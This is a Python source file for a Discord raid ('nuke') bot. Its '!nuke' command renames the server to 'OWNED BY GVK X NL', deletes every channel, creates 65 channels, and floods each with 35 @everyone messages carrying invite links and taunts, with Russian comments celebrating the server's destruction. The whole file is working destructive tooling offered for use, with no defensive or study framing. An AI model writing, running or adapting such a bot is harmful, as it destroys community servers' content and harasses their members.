import discord
from discord.ext import commands
import asyncio

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов к уничтожению')

@bot.command()
async def nuke(ctx):
    await ctx.send("**nonerp ebet**")
    
    guild = ctx.guild
    
    # 1. МЕНЯЕМ НАЗВАНИЕ
    try:
        await guild.edit(name="OWNED BY GVK X NL")
        print("✅ Название изменено")
    except:
        print("❌ Не удалось изменить название")
    
    # 2. УДАЛЯЕМ ВСЕ КАНАЛЫ (быстро, с пропуском защищенных)
    print("🗑️ Удаление каналов...")
    
    async def delete_channel(channel):
        try:
            await channel.delete()
            print(f"   ✅ Удален: #{channel.name}")
        except:
            print(f"   🛡️ Пропущен: #{channel.name}")
    
    await asyncio.gather(*[delete_channel(ch) for ch in guild.channels])
    
    # 3. СОЗДАЁМ 65 КАНАЛОВ ПАРАЛЛЕЛЬНО (БЫСТРО!)
    print("🔥 БЫСТРОЕ создание 65 каналов и отправка 35 сообщений...")
    
    SPAM_TEXT = """@everyone
**ТРАХНУТЫ BY GVK X NL**

https://discord.gg/neverlosehdhenrhd
https://discord.gg/HTr7pU7ttZ

ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ЦАРЯМИ NLxGVK
"""
    
    async def create_and_spam(i):
        try:
            # Создаем канал
            ch = await guild.create_text_channel(f"gvk-nuked-{i+1}")
            
            # Отключаем права
            try:
                await ch.set_permissions(guild.default_role, send_messages=False)
            except:
                pass
            
            # Отправляем 35 сообщений (быстро, параллельно)
            tasks = [ch.send(SPAM_TEXT) for _ in range(35)]
            await asyncio.gather(*tasks)
            
            print(f"✅ Канал {i+1}/65 готов (35 сообщений)")
            return True
        except Exception as e:
            print(f"❌ Ошибка канала {i+1}: {e}")
            return False
    
    # ЗАПУСКАЕМ ВСЕ КАНАЛЫ ОДНОВРЕМЕННО (БЫСТРО!)
    results = await asyncio.gather(*[create_and_spam(i) for i in range(65)])
    success_count = sum(results)
    
    print("\n" + "="*50)
    print("💀 НЬЮК ЗАВЕРШЁН 💀")
    print(f"✅ Создано каналов: {success_count}")
    print(f"✅ Отправлено сообщений: {success_count * 35}")
    print("="*50)
    
    try:
        await ctx.send("**✅ СЕРВЕР УНИЧТОЖЕН**")
    except:
        pass

@bot.command()
async def status(ctx):
    await ctx.send("🔥 Бот активен! Используй !nuke")

import os
bot.run(os.environ['TOKEN'])
